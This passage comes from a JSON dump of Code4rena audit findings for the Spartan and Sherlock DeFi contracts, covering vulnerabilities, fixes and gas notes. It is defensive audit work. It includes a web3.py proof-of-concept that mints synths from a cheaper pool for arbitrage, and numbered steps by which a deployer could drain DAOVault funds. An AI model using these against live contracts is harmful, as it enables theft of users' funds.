libraries or even uses a proxy factory to create new pools.   Ref to proxy factory:  https://eips.ethereum.org/EIPS/eip-1167  "}, {"title": "Pool.sol & Synth.sol: Failing Max Value Allowance", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/29", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  In the `_approve` function, if the allowance passed in is `type(uint256).max`, nothing happens (ie. allowance will still remain at previous value). Contract integrations (DEXes for example) tend to hardcode this value to set maximum allowance initially, but this will result in zero allowance given instead.  This also makes the comment `// No need to re-approve if already max` misleading, because the max allowance attainable is `type(uint256).max - 1`, and re-approval does happen in this case.  This affects the `approveAndCall` implementation since it uses `type(uint256).max` as the allowance amount, but the resulting allowance set is zero.  ### Recommended Mitigation Steps  Keep it simple, remove the condition.  ```jsx function _approve(address owner, address spender, uint256 amount) internal virtual {         require(owner != address(0), \"!owner\");         require(spender != address(0), \"!spender\");         _allowances[owner][spender] = amount;         emit Approval(owner, spender, amount);     } ```  "}, {"title": "DEPLOYER can drain DAOVault funds + manipulate proposal results", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/27", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  2 conditions enable the `DEPLOYER` to drain the funds in the DAOVault.  - `DAOVault` is missing `purgeDeployer()` function - `onlyDAO()` is callable by both the `DAO` and the `DEPLOYER`  The `DEPLOYER` can, at any time, call `depositLP()` to increase the LP funds of any account, then call `withdraw()` to withdraw the entire balance.  The only good use case for the `DEPLOYER` here is to help perform emergency withdrawals for users. However, this could use a separate modifier, like `onlyDeployer()`.  ### Proof of Concept  1. `DEPLOYER` calls `depositLP()` with any arbitrary amount (maybe DAOVault's pool LP balance - Alice's deposited LP balance) for Alice and pool to increase their weight and balance. 2. At this point, Alice may vote for a proposal to swing it in her favour, or remove it otherwise (to implicitly vote against it) 3. `DEPLOYER` calls `withdraw()` for the Alice, which removes 100% of her balance (and therefore, the entire DAOVault's pool balance)  ### Recommended Mitigation Steps  - Create a separate role and modifier for the `DEPLOYER`, so that he is only able to call `withdraw()` but not `depositLP()` - Include the missing `purgeDeployer()` function.  "}, {"title": "memberCount not accurate", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/26", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "disagree with severity"], "target": "2021-07-spartan-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The function depositForMember of BondVault.sol adds user to the array arrayMembers. However it does this for each asset that a user deposits. Suppose a user deposit multiple assets, than the user is added multiple times to the array arrayMembers.  This will mean the memberCount() doesn't show accurate results. Also allMembers() will contain duplicate members  ## Proof of Concept // https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/BondVault.sol#L60 function depositForMember(address asset, address member, uint LPS) external onlyDAO returns(bool){         if(!mapBondAsset_memberDetails[asset].isMember[member]){             mapBondAsset_memberDetails[asset].isMember[member] = true; // Register user as member (scope: user -> asset)             arrayMembers.push(member); // Add user to member array (scope: vault)             mapBondAsset_memberDetails[asset].members.push(member); // Add user to member array (scope: user -> asset)         }        ...      // Get the total count of all existing & past BondVault members     function memberCount() external view returns (uint256 count){         return arrayMembers.length;     }     function allMembers() external view returns (address[] memory _allMembers){         return arrayMembers;     }  ## Tools Used  ## Recommended Mitigation Steps Use a construction like this: mapping(address => bool) isMember;    if(!isMember[member]){             isMember[member] = true;             arrayMembers.push(member);     }               "}, {"title": "Vulnerable Pool initial rate.", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/23", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "Vulnerable Pool initial rate."}, {"title": "Contract code size exceed contract size limit", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/21", "labels": ["bug", "invalid", "1 (Low Risk)", "sponsor disputed", "disagree with severity"], "target": "2021-07-spartan-findings", "body": "Contract code size exceed contract size limit"}, {"title": "arbitrary synth mint/burn from pool", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/20", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  jonah1005   # Vulnerability details  ## Impact `Pool` can mint arbitrary `Sythn` provided as long as it's a valid synth. When there are multiple curated pools and synth (which the protocol is designed for), hackers can mint expensive synthetics from a cheaper AMM pool. The hacker can burn the minted synth at the expensive pool and get profit. The arbitrage profit can be amplified with flash loan services and break all the pegs.  ## Proof of Concept Pool's mintSynth logic: https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L229-L242  Synth's mintSynth logic: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L165-L171  Synth's authorization logic: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242   The price of the synthetics to be mint is calculated in `Pool` based on the AMM price of the current Pool   Here's a web3.py script of minting arbitrary Synth in a pool. For simplicity, two pools are set with the assumption that link is 10x expensive than dai.  ```python sparta_amount = 100 * 10**18 initail_link_synth = link_synth.functions.balanceOf(user).call() base.functions.transfer(link_pool.address, sparta_amount).transact({'from': user}) link_pool.functions.mintSynth(link_synth.address, user).transact({'from': user}) after_link_synth = link_synth.functions.balanceOf(user).call()  print('get link synth amount from link pool:', after_link_synth - initail_link_synth)  sparta_amount = 100 * 10**18 initail_link_synth = link_synth.functions.balanceOf(user).call() base.functions.transfer(dai_pool.address, sparta_amount).transact({'from': user}) dai_pool.functions.mintSynth(link_synth.address, user).transact({'from': user}) after_link_synth = link_synth.functions.balanceOf(user).call()  print('get link synth amount from dai pool:', after_link_synth - initail_link_synth)  ```  The log of the above script ``` get link synth amount from link pool: 97078046905036524413 get link synth amount from dai pool: 970780469050365244136 ``` ## Tools Used  Hardhat  ## Recommended Mitigation Steps Checks the provided synth's underlying token in `mintSynth`  `require(iSYNTH(synthOut).LayerONE() == TOKEN, \"invalid synth\");`    "}, {"title": "Contract file name does not follow coding conventions", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/19", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "Contract file name does not follow coding conventions"}, {"title": "error_reporting = E_ALL & ~E_DEPRECATED", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/18", "labels": ["bug", "invalid", "3 (High Risk)", "sponsor disputed"], "target": "2021-07-spartan-findings", "body": "error_reporting = E_ALL & ~E_DEPRECATED"}, {"title": "grantFunds will revert after a DAO upgrade.", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/17", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact When the DAO is upgraded via moveDao, it also updates the DAO address in BASE. However it doesn't update the DAO address in the Reserve.sol contract. This could be done with the function setIncentiveAddresses(..)  Now the next time grantFunds of DAO.sol is called, its tries to call:  _RESERVE.grantFunds(...)  The grantFunds of Reserve.sol has the modifier onlyGrantor(), which checks the msg.sender == DAO. However in the mean time the DAO has been updated and Reserve.sol doesn't know about it and thus the modifier will not allow access to the function. Thus grantFunds will revert.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L452  function moveDao(uint _proposalID) internal {         address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address         require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid         DAO = _proposedAddress; // Change the DAO to point to the new DAO address         iBASE(BASE).changeDAO(_proposedAddress); // Change the BASE contract to point to the new DAO address         daoHasMoved = true; // Set status of this old DAO         completeProposal(_proposalID); // Finalise the proposal     }      function grantFunds(uint _proposalID) internal {         uint256 _proposedAmount = mapPID_param[_proposalID]; // Get the proposed SPARTA grant amount         address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed SPARTA grant recipient         require(_proposedAmount != 0, \"!param\"); // Proposed grant amount must be valid         require(_proposedAddress != address(0), \"!address\"); // Proposed recipient must be valid         _RESERVE.grantFunds(_proposedAmount, _proposedAddress); // Grant the funds to the recipient         completeProposal(_proposalID); // Finalise the proposal     }  // https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/outside-scope/Reserve.sol#L17   modifier onlyGrantor() {         require(msg.sender == DAO || msg.sender == ROUTER || msg.sender == DEPLOYER || msg.sender == LEND || msg.sender == SYNTHVAULT, \"!DAO\");         _;      }    function grantFunds(uint amount, address to) external onlyGrantor {       ....     }     function setIncentiveAddresses(address _router, address _lend, address _synthVault, address _Dao) external onlyGrantor {         ROUTER = _router;         LEND = _lend;         SYNTHVAULT = _synthVault;         DAO = _Dao;     }   ## Tools Used  ## Recommended Mitigation Steps Call setIncentiveAddresses(..) when a DAO upgrade is done.   "}, {"title": "In the beginning its relatively easy to gain majority share", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/14", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "In the beginning its relatively easy to gain majority share"}, {"title": "(out of scope) mintFromDAO of Sparta.sol can go over max supply", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/10", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "(out of scope) mintFromDAO of Sparta.sol can go over max supply"}, {"title": "Result of transfer / transferFrom not checked", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/8", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact A call to transferFrom or transfer is frequently done without checking the results. For certain ERC20 tokens, if insufficient tokens are present, no revert occurs but a result of \"false\" is returned. So its important to check this. If you don't you could mint tokens without have received sufficient tokens to do so. So you could loose funds.  Its also a best practice to check this. See below for example where the result isn't checked.  Note, in some occasions the result is checked (see below for examples).  ## Proof of Concept Highest risk: .\\Dao.sol:                iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer user's assets to Dao contract .\\Pool.sol:               iBEP20(TOKEN).transfer(member, outputToken); // Transfer the TOKENs to user .\\Pool.sol:               iBEP20(token).transfer(member, outputAmount); // Transfer the swap output to the selected user .\\poolFactory.sol:   iBEP20(_token).transferFrom(msg.sender, _pool, _amount); .\\Router.sol:           iBEP20(_fromToken).transfer(fromPool, iBEP20(_fromToken).balanceOf(address(this))); // Transfer TOKENs from ROUTER to fromPool .\\Router.sol:           iBEP20(_token).transfer(_pool, iBEP20(_token).balanceOf(address(this))); // Transfer TOKEN to pool .\\Router.sol:           iBEP20(_token).transferFrom(msg.sender, _pool, _amount); // Transfer TOKEN to pool .\\Router.sol:           iBEP20(_token).transfer(_recipient, _amount); // Transfer TOKEN to recipient .\\Synth.sol:             iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer tokens in  less risky .\\Router.sol:           iBEP20(fromPool).transferFrom(_member, fromPool, unitsInput); // Transfer LPs from user to the pool .\\BondVault.sol:     iBEP20(_pool).transfer(member, _claimable); // Send claim amount to user .\\Router.sol:           iBEP20(_pool).transferFrom(_member, _pool, units); // Transfer LPs to the pool .\\Router.sol:           iBEP20(_pool).transferFrom(_member, _pool, units); // Transfer LPs to pool .\\Router.sol:           iBEP20(fromSynth).transferFrom(msg.sender, _poolIN, inputAmount); // Transfer synth from user to pool .\\Pool.sol:               iBEP20(synthIN).transfer(synthIN, _actualInputSynth); // Transfer SYNTH to relevant synth contract .\\Router.sol:           iBEP20(WBNB).transfer(_pool, _amount); // Transfer WBNB from ROUTER to pool .\\Dao.sol:               iBEP20(BASE).transfer(newDAO, baseBal); .\\Pool.sol:               iBEP20(BASE).transfer(member, outputBase); // Transfer the SPARTA to user .\\Pool.sol:               iBEP20(BASE).transfer(member, outputBase); // Transfer SPARTA to user .\\Router.sol:           iBEP20(BASE).transfer(toPool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA from ROUTER to toPool .\\Router.sol:           iBEP20(BASE).transfer(_pool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA to pool .\\Router.sol:           iBEP20(BASE).transfer(_pool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA from ROUTER to pool .\\Router.sol:           iBEP20(BASE).transferFrom(msg.sender, _pool, inputAmount); // Transfer SPARTA from ROUTER to pool  Sometimes the result is checked: .\\Dao.sol:              require(iBEP20(pool).transferFrom(msg.sender, address(_DAOVAULT), amount), \"!funds\"); // Send user's deposit to the DAOVault .\\Dao.sol:              require(iBEP20(BASE).transferFrom(msg.sender, address(_RESERVE), _amount), '!fee'); // User pays the new proposal fee .\\DaoVault.sol:      require(iBEP20(pool).transfer(member, _balance), \"!transfer\"); // Transfer user's balance to their wallet .\\synthVault.sol:    require(iBEP20(synth).transferFrom(msg.sender, address(this), amount)); // Must successfuly transfer in .\\synthVault.sol:    require(iBEP20(synth).transfer(msg.sender, redeemedAmount)); // Transfer from SynthVault to user  ## Tools Used grep  ## Recommended Mitigation Steps Always check the result of transferFrom and transfer   "}, {"title": "Can't add BNB with createPoolADD", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/7", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "Can't add BNB with createPoolADD"}, {"title": "Block usage of addCuratedPool ", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/6", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "disagree with severity"], "target": "2021-07-spartan-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The function curatedPoolCount() contains a for loop over the array arrayPools. If arrayPools would be too big then the loop would run out of gas and curatedPoolCount() would revert. This would mean that addCuratedPool() cannot be executed anymore (because it calls curatedPoolCount() )  The array arrayPools can be increased in size arbitrarily by repeatedly doing the following: - create a pool with createPoolADD()  (which requires 10,000 SPARTA) - empty the pool with remove() of Pool.sol, which gives back the SPARTA tokens These actions will use gas to perform.  ## Proof of Concept //https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/poolFactory.sol#L45  function createPoolADD(uint256 inputBase, uint256 inputToken, address token) external payable returns(address pool){         require(getPool(token) == address(0)); // Must be a valid token         require((inputToken > 0 && inputBase >= (10000*10**18)), \"!min\"); // User must add at least 10,000 SPARTA liquidity & ratio must be finite         Pool newPool; address _token = token;         if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB         require(_token != BASE && iBEP20(_token).decimals() == 18); // Token must not be SPARTA & it's decimals must be 18         newPool = new Pool(BASE, _token); // Deploy new pool         pool = address(newPool); // Get address of new pool         mapToken_Pool[_token] = pool; // Record the new pool address in PoolFactory         _handleTransferIn(BASE, inputBase, pool); // Transfer SPARTA liquidity to new pool         _handleTransferIn(token, inputToken, pool); // Transfer TOKEN liquidity to new pool         arrayPools.push(pool); // Add pool address to the pool array        ..  function curatedPoolCount() internal view returns (uint){         uint cPoolCount;          for(uint i = 0; i< arrayPools.length; i++){             if(isCuratedPool[arrayPools[i]] == true){                 cPoolCount += 1;             }         }         return cPoolCount;     }   function addCuratedPool(address token) external onlyDAO {         ...         require(curatedPoolCount() < curatedPoolSize, \"maxCurated\"); // Must be room in the Curated list  //https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L187   function remove() external returns (uint outputBase, uint outputToken) {         return removeForMember(msg.sender);     }       // Contract removes liquidity for the user     function removeForMember(address member) public returns (uint outputBase, uint outputToken) {         uint256 _actualInputUnits = balanceOf(address(this)); // Get the received LP units amount         outputBase = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, BASE, address(this)); // Get the SPARTA value of LP units         outputToken = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, TOKEN, address(this)); // Get the TOKEN value of LP units         _decrementPoolBalances(outputBase, outputToken); // Update recorded BASE and TOKEN amounts         _burn(address(this), _actualInputUnits); // Burn the LP tokens         iBEP20(BASE).transfer(member, outputBase); // Transfer the SPARTA to user         iBEP20(TOKEN).transfer(member, outputToken); // Transfer the TOKENs to user         emit RemoveLiquidity(member, outputBase, outputToken, _actualInputUnits);         return (outputBase, outputToken);     } ## Tools Used  ## Recommended Mitigation Steps Create a variable curatedPoolCount and increase it in addCuratedPool and decrease it in removeCuratedPool   "}, {"title": "check if pool exists in getPool ", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/5", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The function getPool doesn't check if the pool exits (e.g. it doesn't check if the resulting pool !=0) Other functions use the results of getPool and do followup actions.  For example createSynth checks isCuratedPool(_pool) == true; if somehow isCuratedPool(0) would set to be true, then further actions could be done. As far as I can see no actual problem occurs, but this is a dangerous construction and future code changes could introduce vulnerabilities. Additionally the reverts that will occur if the result of getPool==0 are perhaps difficult to troubleshoot.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/poolFactory.sol#L119     function getPool(address token) public view returns(address pool){         if(token == address(0)){             pool = mapToken_Pool[WBNB];   // Handle BNB         } else {             pool = mapToken_Pool[token];  // Handle normal token         }          return pool;     }  function createPoolADD(uint256 inputBase, uint256 inputToken, address token) external payable returns(address pool){         require(getPool(token) == address(0)); // Must be a valid token       function createPool(address token) external onlyDAO returns(address pool){         require(getPool(token) == address(0)); // Must be a valid token       // https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/synthFactory.sol#L37  function createSynth(address token) external returns(address synth){         require(getSynth(token) == address(0), \"exists\"); // Synth must not already exist         address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token); // Get pool address         require(iPOOLFACTORY(_DAO().POOLFACTORY()).isCuratedPool(_pool) == true, \"!curated\"); // Pool must be Curated   ## Tools Used  ## Recommended Mitigation Steps In function getPool add something like: require  (pool !=0, \"Pool doesn't exist\");  Note: the functions createPoolADD and createPool also have to be changed, to use a different way to verify the pool doesn't exist.   "}, {"title": "more efficient calls to DAO functions", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/4", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact Sometimes the reference to function calls, that are done via the DAO, are looked up multiple times in one function call. For example mintSynth calls:  \u200b -   _DAO() 4x -   _DAO().UTILS() 3x  This can be done more efficient by caching the result of _DAO() and _DAO().UTILS()  f## Proof of Concept // https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L229 \u200bfunction mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {        \u200brequire(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, \"!synth\"); // Must be a valid Synth      \u200b..        \u200buint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount); // Calculate value of swapping SPARTA to the relevant underlying TOKEN        \u200buint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted       \u200b..        \u200buint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN        \u200bfee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA        \u200b  function _DAO() internal view returns(iDAO) {        \u200breturn iBASE(BASE).DAO();    \u200b}  //https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L624 \u200bfunction UTILS() public view returns(iUTILS){        \u200bif(daoHasMoved){            \u200breturn Dao(DAO).UTILS();        \u200b} else {            \u200breturn _UTILS;        \u200b}    \u200b}  ## Tools Used  ## Recommended Mitigation Step Cache _DAO() and cache the sub functions like: _DAO().UTILS()) If called multiple times from function  "}, {"title": "Dao contract's code size exceeds size limit.", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/2", "labels": ["bug", "invalid", "1 (Low Risk)", "sponsor disputed", "disagree with severity"], "target": "2021-07-spartan-findings", "body": "Dao contract's code size exceeds size limit."}, {"title": "Saving gas by checking the last-recorded block number", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/150", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  The `_accrueSherX` function of `LibSherX` and the `payOffDebtAll` function of `LibPool` can be called multiple times in the same block (from different users and transactions). If the current block number is the same as the last-recorded one, it is possible to save gas by early returning at the beginning of the functions.  ## Proof of Concept  Referenced code: [LibSherX.sol#L123-L141](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/libraries/LibSherX.sol#L123-L141) [LibPool.sol#L84-L95](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/libraries/LibPool.sol#L84-L95)  ## Recommended Mitigation Steps  For example, consider re-writing `_accrueSherX` as follows:  ```solidity function _accrueSherX(IERC20 _token, uint256 sherXPerBlock) private returns (uint256 sherX) {   PoolStorage.Base storage ps = PoolStorage.ps(_token);   if (block.number == ps.sherXLastAccrued) {     return 0;   }   sherX = block.number.sub(ps.sherXLastAccrued).mul(sherXPerBlock).mul(ps.sherXWeight).div(     uint16(-1)   );   // need to settle before return, as updating the sherxperlblock/weight   // after it was 0 will result in a too big amount (accured will be < block.number)   ps.sherXLastAccrued = uint40(block.number);   if (address(_token) == address(this)) {     ps.stakeBalance = ps.stakeBalance.add(sherX);   } else {     ps.unallocatedSherX = ps.unallocatedSherX.add(sherX);     ps.sWeight = ps.sWeight.add(sherX);   } } ```  "}, {"title": "Avoid repeating storage reads in a loop to save gas", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/149", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  A storage read cost more gas than a memory read. State variables that do not change during a loop can be stored in local variables and be read from memory multiple times to save gas.  ## Proof of Concept  Referenced code: [LibPool.sol#L89](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/libraries/LibPool.sol#L89) [LibSherX.sol#L60](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/libraries/LibSherX.sol#L60) [LibSherX.sol#L94](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/libraries/LibSherX.sol#L94) [PoolBase.sol#L131](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/PoolBase.sol#L131) [SherX.sol#L76](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/SherX.sol#L76) [SherX.sol#L98](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/SherX.sol#L98) [SherX.sol#L152](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/SherX.sol#L152) [SherX.sol#L184](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/SherX.sol#L184) [SherX.sol#L243](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/SherX.sol#L243) [Gov.sol#L190](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/Gov.sol#L190)  ## Recommended Mitigation Steps  For example, consider re-writing the `harvestFor(address)` function of `SherX` as follows:  ```solidity function harvestFor(address _user) public override {   GovStorage.Base storage gs = GovStorage.gs();   uint256 len = gs.tokensStaker.length;   for (uint256 i; i < len; i++) {     PoolStorage.Base storage ps = PoolStorage.ps(gs.tokensStaker[i]);     harvestFor(_user, ps.lockToken);   } } ```  "}, {"title": "Gas optimization on calculating the storage slot of a token", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/148", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  In the `PoolStorage` library, declaring the `POOL_STORAGE_PREFIX` constant with type `bytes32`, and change `abi.encode` ti `abi.encodePacked` at line 87 can save gas.  ## Proof of Concept  Referenced code: [PoolStorage.sol#L14](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/storage/PoolStorage.sol#L14) [PoolStorage.sol#L87](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/storage/PoolStorage.sol#L87)  Related links: [Change `string` to `byteX` if possible](https://medium.com/layerx/how-to-reduce-gas-cost-in-solidity-f2e5321e0395#2a78) [Solidity-Encode-Gas-Comparison](https://github.com/ConnorBlockchain/Solidity-Encode-Gas-Comparison)  ## Recommended Mitigation Steps  See above  "}, {"title": "User's `calcUnderlyingInStoredUSD` value is underestimated", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/144", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "disagree with severity"], "target": "2021-07-sherlock-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  The `calcUnderlyingInStoredUSD()` function of `SherX` should return `calcUnderlyingInStoredUSD(getSherXBalance())` instead of `calcUnderlyingInStoredUSD(sx20.balances[msg.sender])` since there could be SherX unallocated to the user at the time of the function call. A similar function, `calcUnderlying()`, calculates the user's underlying tokens based on the user's current balance plus the unallocated ones.  ## Proof of Concept  Referenced code: [SherX.sol#L141](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/SherX.sol#L141)  ## Recommended Mitigation Steps  Change `sx20.balances[msg.sender]` to `getSherXBalance()` at line 141.  "}, {"title": "Tokens cannot be reinitialized with new lock tokens", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/141", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Tokens cannot be reinitialized with new lock tokens"}, {"title": "Cannot set `watsonsSherxWeight` to the maximum", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/140", "labels": ["bug", "invalid", "1 (Low Risk)", "sponsor disputed"], "target": "2021-07-sherlock-findings", "body": "Cannot set `watsonsSherxWeight` to the maximum"}, {"title": "Inconsistent block number comparison when deciding an unstaking entry is active", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/139", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  shw   # Vulnerability details  The `getInitialUnstakeEntry` function of `PoolBase` returns the first active unstaking entry of a staker, which requires the current block to be strictly before the last block in the unstaking window. However, the `unstake` function allows the current block to be exactly the same as the last block (same logic in `unstakeWindowExpiry`).  ## Proof of Concept  Referenced code: [PoolBase.sol#L136](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/PoolBase.sol#L136) [PoolBase.sol#L344](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/PoolBase.sol#L344) [PoolBase.sol#L364](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/PoolBase.sol#L364)  ## Recommended Mitigation Steps  Change the `<=` comparison at line 136 to `<` for consistency.  "}, {"title": "Possible divide-by-zero error in `PoolBase`", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/136", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  A possible divide-by-zero error could happen in the `getSherXPerBlock(uint256, IERC20)` function of `PoolBase` when the `totalSupply` of `lockToken` and `_lock` are both 0.  ## Proof of Concept  Referenced code: [PoolBase.sol#L215](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/PoolBase.sol#L215)  ## Recommended Mitigation Steps  Check if `baseData().lockToken.totalSupply().add(_lock)` equals to 0 before line 214. If so, then return 0.  "}, {"title": "Missing non-zero address checks", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/135", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Missing non-zero address checks"}, {"title": "SafeMath library is not always used in `PoolBase`", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/133", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "SafeMath library is not always used in `PoolBase`"}, {"title": "order of operations in Payout.sol", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/130", "labels": ["bug", "invalid", "1 (Low Risk)", "sponsor disputed"], "target": "2021-07-sherlock-findings", "body": "order of operations in Payout.sol"}, {"title": "Confusing exponentiation (10e17)", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/129", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  0xsanson   # Vulnerability details  ## Impact The value `10e17` can be confusing, since it doesn't clearly appear from where the exponent 17 comes from (people may ctrl+f or grep the code for other instances of it without results). Indeed throughout the code the expression `10**18` is used.  ## Proof of Concept https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/Payout.sol#L185  ## Tools Used editor  ## Recommended Mitigation Steps Better ways of writing it are `1e18` or `10**18`.  "}, {"title": "Uncheckable math in `redeem()`", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/127", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "Uncheckable math in `redeem()`"}, {"title": "uncheckable math in `payout()`", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/126", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "uncheckable math in `payout()`"}, {"title": "NatSpec typo in `_doSherX` @return", "html_url": 